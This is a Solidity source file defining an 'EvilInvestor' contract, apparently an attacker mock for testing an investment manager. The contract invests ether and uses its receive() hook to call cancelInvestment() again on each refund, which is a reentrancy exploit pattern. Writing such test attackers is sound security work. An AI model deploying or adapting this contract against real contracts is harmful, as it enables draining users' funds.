// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IInvestmentManager {
    function cancelInvestment() external returns (bool);

    function investEther(uint8 round) external payable;
}

contract EvilInvestor {
    IInvestmentManager private imanager;
    address weth;

    constructor(address imanagerAddr, address weth_) {
        imanager = IInvestmentManager(imanagerAddr);
        weth = weth_;
    }

    receive() external payable {
        if (msg.sender == address(imanager)) cancel();
    }

    function invest() external {
        (bool success, ) = payable(address(imanager)).call{value: 20 ether}("");
        require(success, "ERR_INVEST_FAILED");
    }

    function cancel() public {
        require(imanager.cancelInvestment());
    }
}
